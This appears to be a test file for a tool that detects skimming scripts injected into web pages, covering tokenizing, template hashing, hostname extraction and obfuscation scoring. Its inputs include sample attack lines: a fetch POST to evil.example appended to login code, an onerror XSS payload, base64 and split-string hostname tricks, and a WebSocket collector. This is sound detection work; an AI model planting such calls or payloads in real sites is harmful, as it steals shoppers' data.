import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { tokenize } from '../../src/analyze/tokenize.js';
import { templateOf } from '../../src/analyze/template.js';
import { extractHostnames, isIgnoredHost } from '../../src/analyze/hostnames.js';
import { obfuscationBand } from '../../src/analyze/obfuscation.js';

const code = (name) => readFileSync(new URL(`../fixtures/code/${name}`, import.meta.url), 'utf8');

test('tokenize tells strings, regexes, templates and division apart', () => {
  const kinds = (src) => tokenize(src).filter((t) => t.type !== 'comment').map((t) => `${t.type}:${t.value}`);
  assert.deepEqual(kinds('a = b / c / d'), ['ident:a', 'punct:=', 'ident:b', 'punct:/', 'ident:c', 'punct:/', 'ident:d']);
  assert.deepEqual(kinds('x = /ab+c/gi.test(s)'), ['ident:x', 'punct:=', 'regex:/ab+c/gi', 'punct:.', 'ident:test', 'punct:(', 'ident:s', 'punct:)']);
  assert.deepEqual(kinds('return /x/'), ['ident:return', 'regex:/x/']);
  assert.deepEqual(kinds("s = 'it\\'s' + \"q\""), ['ident:s', 'punct:=', "string:'it\\'s'", 'punct:+', 'string:"q"']);
  assert.deepEqual(kinds('t = `a${b + `c`}d`'), ['ident:t', 'punct:=', 'template:`a${b + `c`}d`']);
  assert.deepEqual(kinds('n = 0x1F + 1_000n + 1e-3 // c'), ['ident:n', 'punct:=', 'number:0x1F', 'punct:+', 'number:1_000n', 'punct:+', 'number:1e-3']);
});

test('the template ignores nonce changes in a WooCommerce data script', () => {
  assert.equal(templateOf(code('woo-a.js')).hash, templateOf(code('woo-b.js')).hash);
});

test('the template ignores data changes in framework data scripts', () => {
  const a = templateOf(code('next-data-a.js'));
  assert.equal(a.hash, templateOf(code('next-data-b.js')).hash);
  assert.equal(a.dataGlobal, '__NEXT_DATA__');
  assert.equal(templateOf(code('flight-a.js')).hash, templateOf(code('flight-b.js')).hash);
  assert.equal(templateOf(code('nuxt-a.js')).hash, templateOf(code('nuxt-b.js')).hash);
});

test('the template changes when code is added', () => {
  const base = code('login-inline.js');
  assert.notEqual(templateOf(base).hash, templateOf(`${base}\nfetch('https://evil.example/c',{method:'POST'});`).hash);
});

test('the template changes when an endpoint or an eval payload is swapped', () => {
  const base = code('login-inline.js');
  assert.notEqual(templateOf(base).hash, templateOf(base.replace('api.shop.example', 'evil.example')).hash);
  assert.notEqual(templateOf('eval("a()")').hash, templateOf('eval("b()")').hash);
  assert.notEqual(templateOf('el.innerHTML = "<b>x</b>"').hash, templateOf('el.innerHTML = "<img src=x onerror=steal()>"').hash);
});

test('the template ignores plain literal changes in ordinary code', () => {
  assert.equal(templateOf('var price = 19.99; label("Shirt");').hash, templateOf('var price = 25; label("Hat and scarf");').hash);
});

test('hostnames come from joined, escaped and base64 strings', () => {
  assert.deepEqual(extractHostnames("var u = 'https://ba' + 'ways.com/x';"), ['baways.com']);
  assert.deepEqual(extractHostnames("var h = 'ba' + 'ways.com';"), ['baways.com']);
  assert.deepEqual(extractHostnames('var h = "\\x65vil-cdn.com";'), ['evil-cdn.com']);
  assert.deepEqual(extractHostnames('var h = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYw==");'), ['evil.example']);
  assert.deepEqual(extractHostnames('send("10.0.0.7")'), ['10.0.0.7']);
  assert.deepEqual(extractHostnames('ws = new WebSocket("wss://collect.evil.example:8443/s")'), ['collect.evil.example']);
  assert.deepEqual(extractHostnames(code('gtm-skimmer.js')), ['evil.example']);
});

test('property names and dotted words are not hostnames', () => {
  assert.deepEqual(extractHostnames('a.click(); e.name; n.top; x.style.display = "none"; key = "form.page"; k = "user.name"'), []);
  assert.deepEqual(extractHostnames('img.src = "data:image/png;base64,iVBORw0KGgo="'), []);
});

test('namespace and documentation hosts are ignored', () => {
  assert.equal(isIgnoredHost('www.w3.org'), true);
  assert.deepEqual(extractHostnames('el = document.createElementNS("http://www.w3.org/2000/svg", "svg")'), []);
  assert.deepEqual(extractHostnames(code('react-min.js')), []);
});

test('obfuscation bands', () => {
  assert.equal(obfuscationBand(code('readable.js')), 'plain');
  assert.equal(obfuscationBand(code('react-min.js')), 'minified');
  assert.equal(obfuscationBand(code('obfuscated.js')), 'packed');
  assert.notEqual(obfuscationBand(code('css-in-js.js')), 'packed');
});

test('the template collapses data blobs in ordinary scripts', () => {
  const a = 'var products = [{"t":"Shirt","p":19.99},{"t":"Hat","p":9.5}]; var cfg = {theme: "dark", rows: 3, show: !0}; render(products, cfg);';
  const b = 'var products = [{"t":"Scarf","p":29}]; var cfg = {theme: "light", rows: 12, show: !1}; render(products, cfg);';
  assert.equal(templateOf(a).hash, templateOf(b).hash);
  assert.notEqual(templateOf(a).hash, templateOf(a.replace('render(products, cfg);', 'render(products, cfg); steal(cfg);')).hash);
});
